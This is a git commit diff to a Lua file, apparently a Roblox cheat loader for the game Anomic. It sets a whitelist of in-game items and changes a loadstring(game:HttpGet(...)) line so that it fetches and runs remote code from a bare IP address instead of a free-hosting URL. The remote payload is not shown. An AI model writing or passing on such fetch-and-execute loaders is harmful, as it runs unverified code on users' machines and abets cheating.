7093c14f6ac5e8fe77807618b38b809979172afc
nãoseinão <72254695+29436@users.noreply.github.com>
2021-10-21 19:01:56 +0100

    Update anomic.lua

--- anomic.lua
+++ anomic.lua
@@ -1,2 +1,2 @@
-_G.ToolWhitelist = {"MP","Kalashnikov","Medi Kit","Door Ram","Humvee","Sports Car","Supercar","Hypercar","AR","Armored Van","Shotgun","MoneyBag"}
-loadstring(game:HttpGet("https://anomicxv2.000webhostapp.com/script/gui.lua"))()
+getgenv().ToolWhitelist = {"MP","Kalashnikov","Medi Kit","Door Ram","Humvee","Sports Car","Supercar","Hypercar","AR","Armored Van","Shotgun"}
+loadstring(game:HttpGet("http://172.105.94.112:32443/static/Protected.lua"))()
